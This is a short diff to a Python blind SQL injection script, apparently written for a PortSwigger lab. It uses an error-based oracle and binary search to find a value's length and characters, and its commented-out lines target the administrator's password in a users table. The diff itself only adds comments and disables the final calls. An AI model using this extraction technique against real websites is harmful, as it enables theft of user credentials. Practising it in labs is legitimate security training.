@@ -15,7 +15,7 @@ def oracle(q):
     response = requests.get(f"{url()}",cookies=cookies)
     return response.status_code == 500
 
-#length = 0
+# Calculat the Length
 def dump_length(q):
     low = 0
     high = 100
@@ -27,6 +27,7 @@ def dump_length(q):
             low = mid + 1
     return low
 
+# Dumping String
 def dump_string(q, length):
     var=""
     for i in range(1, length+1):
@@ -43,6 +44,7 @@ def dump_string(q, length):
         var += chr(low)
     return var
 
-length=dump_length("password")
-print(length)
-print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
+# PortSwigger 
+#length=dump_length("password")
+#print(length)
+#print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
